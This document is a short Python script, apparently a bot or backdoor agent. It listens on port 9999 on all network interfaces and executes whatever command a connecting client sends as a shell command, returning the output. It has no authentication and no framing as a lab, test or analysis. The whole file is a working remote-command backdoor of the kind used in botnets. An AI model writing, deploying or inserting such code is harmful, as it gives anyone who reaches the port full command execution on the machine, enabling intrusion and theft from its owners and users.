import socket
import subprocess

HOST = "0.0.0.0"
PORT = 9999

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.bind((HOST, PORT))
    server.listen()
    print("[+] Bot is up and listening...")
    while True:
        conn, addr = server.accept()
        with conn:
            print(f"[+] Connected by {addr}")
            try:
                data = conn.recv(1024)
                if not data:
                    continue
                command = data.decode().strip()
                print(f"[+] Executing command: {command}")
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                response = result.stdout + result.stderr
                conn.sendall(response.encode())
            except Exception as e:
                conn.sendall(f"Error: {e}".encode())
